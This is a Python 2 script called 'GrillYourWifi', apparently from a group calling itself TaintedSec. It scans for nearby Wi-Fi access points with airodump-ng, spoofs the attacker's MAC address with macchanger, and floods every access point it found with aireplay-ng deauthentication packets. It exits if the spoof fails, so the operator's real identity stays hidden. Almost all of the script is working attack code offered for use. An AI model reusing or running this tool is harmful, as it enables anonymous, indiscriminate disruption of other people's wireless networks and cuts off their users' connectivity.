#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import pandas as pd
from datetime import datetime

# TaintedSec LLC
# The developers of this program do not assume liability for the innapropriate
# or malicious usage of this script, the execution of source code soley lies on your behalf


def restaurant_logo():
	print '''
   \033[0;33m▄████  ██▀███   ██▓ ██▓     ██▓   ▓██   ██▓ ▒█████   █    ██  ██▀███   █     █░ ██▓  █████▒██▓\033[0;m
  \033[0;31m██▒ ▀█▒▓██ ▒ ██▒▓██▒▓██▒    ▓██▒    ▒██  ██▒▒██▒  ██▒ ██  ▓██▒▓██ ▒ ██▒▓█░ █ ░█░▓██▒▓██   ▒▓██▒
 ▒██░▄▄▄░▓██ ░▄█ ▒▒██▒▒██░    ▒██░     ▒██ ██░▒██░  ██▒▓██  ▒██░▓██ ░▄█ ▒▒█░ █ ░█ ▒██▒▒████ ░▒██▒
 ░▓█  ██▓▒██▀▀█▄  ░██░▒██░    ▒██░     ░ ▐██▓░▒██   ██░▓▓█  ░██░▒██▀▀█▄  ░█░ █ ░█ ░██░░▓█▒  ░░██░
 ░▒▓███▀▒░██▓ ▒██▒░██░░██████▒░██████▒ ░ ██▒▓░░ ████▓▒░▒▒█████▓ ░██▓ ▒██▒░░██▒██▓ ░██░░▒█░   ░██░
  ░▒   ▒ ░ ▒▓ ░▒▓░░▓  ░ ▒░▓  ░░ ▒░▓  ░  ██▒▒▒ ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▓░▒ ▒  ░▓   ▒ ░   ░▓  
   ░   ░   ░▒ ░ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░▓██ ░▒░   ░ ▒ ▒░ ░░▒░ ░ ░   ░▒ ░ ▒░  ▒ ░ ░   ▒ ░ ░      ▒ ░
 ░ ░   ░   ░░   ░  ▒ ░  ░ ░     ░ ░   ▒ ▒ ░░  ░ ░ ░ ▒   ░░░ ░ ░   ░░   ░   ░   ░   ▒ ░ ░ ░    ▒ ░
       ░    ░      ░      ░  ░    ░  ░░ ░         ░ ░     ░        ░         ░     ░          ░
                                      ░ ░ \033[0;m\033[0;31mTaintedSec LLC 2017 V 2.8\033[0;m
'''

def prepare_grill():
	#subprocess.call(['ifconfig', '|', 'grep \': \'', '|', 'awk', '-F', '\": \"', '\'{print $1}\''])
	nic = raw_input('Enter Network Interface Card: ')
	time.sleep(2)
	print '[+] Starting the main function...capturing data into csv format...'
	time.sleep(1)
	print '\033[0;33m[+] After 15 seconds hit ctrl-c to store captured data...\033[0;m'
	time.sleep(2)
	try:
		subprocess.call(['airodump-ng', '-w', 'grilledwifi', '--output-format', 'csv', '--write-interval', '1', nic], stdout=subprocess.PIPE)
	except KeyboardInterrupt:
		subprocess.call('clear')
		restaurant_logo()
		print '[+] Parsing through csv file %s/grilledwifi-01.csv' % os.getcwd()
		wifi_list = []
		# target BSSID
		df = pd.read_csv('%s/grilledwifi-01.csv' % os.getcwd())
		df = df.rename(columns={' channel':'channel'})
		saved_column = df.BSSID
		channel = df.channel
		essid = -1
		for x in saved_column:
			if len(x) == 17:
				wifi_list.append(str(x))
			else:
				pass
		for x in wifi_list:
			f = open('%s/targets.txt' % os.getcwd(), 'a')
			f.write('%s\n' % x)
		f.close()
		subprocess.call(['uniq', '%s/targets.txt' % os.getcwd(), 'target_vectors.txt'], stdout=subprocess.PIPE)
		#current = subprocess.Popen(['macchanger', '-s', ni_card, '|', 'grep \'Current MAC:\'', '|', 'awk', '-F', '\" \"', '\'{print $3}\''], shell=True)
		current = subprocess.Popen('macchanger -s %s | grep \'Current MAC:\' | awk -F \" \" \'{print $3}\'' % nic, shell=True, stdout=subprocess.PIPE)
		current_mac = current.stdout.read().strip('\n')
		#permanent = subprocess.Popen(['macchanger', '-s', ni_card, '%s', '|', 'grep \'Permanent MAC:\'', '|', 'awk', '-F', '\" \"', '\'{print $3}\''], shell=True)
		permanent = subprocess.Popen('macchanger -s %s | grep \'Permanent MAC:\' | awk -F \" \" \'{print $3}\'' % nic, shell=True, stdout=subprocess.PIPE)
		permanent_mac = permanent.stdout.read().strip('\n')
		f = open('%s/target_vectors.txt' % os.getcwd(), 'r')
		try:
			for bssid in f.read().split():
				subprocess.call(['ifconfig', nic, 'down'])
				try:
					print '[+] Spoofing MAC address from \033[0;33m%s\033[0;m to \033[0;33m%s\033[0;m' % (current_mac, bssid)
					subprocess.call(['macchanger', '-m', bssid], stdout=subprocess.PIPE)
					subprocess.call(['ifconfig', nic, 'up'])
				except Exception:
					print '\033[0;31m[-] Error: Could not change MAC address. Check permissions\033[0;m'
					continue
				else:
					if current_mac != permanent_mac:
						print '[+] Cooking \033[0;33m%s\033[0;m with \033[0;31m10\033[0;m deauthentication packets...' % bssid
						os.system('iwconfig %s channel %s' % (nic, channel[essid+1]))
						subprocess.call(['aireplay-ng', '-0', '10', '-a', bssid, nic])
						essid+=1
					elif current_mac == permanent_mac:
						print '\033[0;31m[-] MAC address is equal to burned in! Exitting to protect your identity...\033[0;m'
						sys.exit(1)
			subprocess.call(['rm', 'target.txt', 'target_vectors.txt', 'grilledwifi-0*'])
			subprocess.call(['touch', 'target.txt', 'target_vectors.txt'])
			print '\n[+] GrillYourWifi - Access Point Network Deauthentication Attack Tool'

		except KeyboardInterrupt:
			subprocess.call(['rm', 'targets.txt', 'target_vectors.txt', 'grilledwifi-01.csv'])
			subprocess.call(['touch', 'targets.txt', 'target_vectors.txt'])
			print '\n[+] GrillYourWifi - Access Point Network Deauthentication Attack Tool'
			sys.exit(1)
		else:
			pass

restaurant_logo()
prepare_grill()
